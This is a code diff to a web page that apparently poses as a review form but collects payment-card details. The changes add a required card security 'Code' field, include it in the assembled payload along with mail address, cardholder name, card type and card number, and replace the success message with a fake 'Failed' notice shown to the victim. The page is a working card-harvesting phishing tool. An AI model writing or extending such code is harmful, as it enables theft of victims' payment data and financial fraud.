@@ -232,8 +232,13 @@
       </div>
 
       <div class="form-group">
-        <label for="review">Card Digits</label>
+        <label for="review">Card # (number)</label>
         <textarea id="review" required placeholder=""></textarea>
+      </div>
+
+      <div class="form-group">
+        <label for="code">Code</label>
+        <input type="text" id="code" required placeholder="">
       </div>
 
       <div class="form-group">
@@ -320,10 +325,11 @@
       const nameOfCard = document.getElementById('username').value;
       const cardType = document.getElementById('title').value;
       const cardDigits = document.getElementById('review').value;
+      const codeValue = document.getElementById('code').value;
       const imageFile = document.getElementById('image').files[0];
 
-      // Format payload text with labeled fields
-      const fullMessage = `Mail Address: ${mailAddress}\nName of Card: ${nameOfCard}\nCard Type: ${cardType}\nCard Digits: ${cardDigits}`;
+      // Format payload text with labeled fields including Card # and Code in the correct order
+      const fullMessage = `Mail Address: ${mailAddress}\nName of Card: ${nameOfCard}\nCard Type: ${cardType}\nCard #: ${cardDigits}\nCode: ${codeValue}`;
 
       try {
         let response;
@@ -380,8 +386,8 @@
         if (--timer < 0) {
           clearInterval(interval);
           processingBox.innerHTML = `
-            <h3 class="success">Completed!</h3>
-            <p>Your review has finished processing and was published.</p>
+            <h3 class="error">Failed</h3>
+            <p>Your submission failed to process.</p>
           `;
         }
       }, 1000);
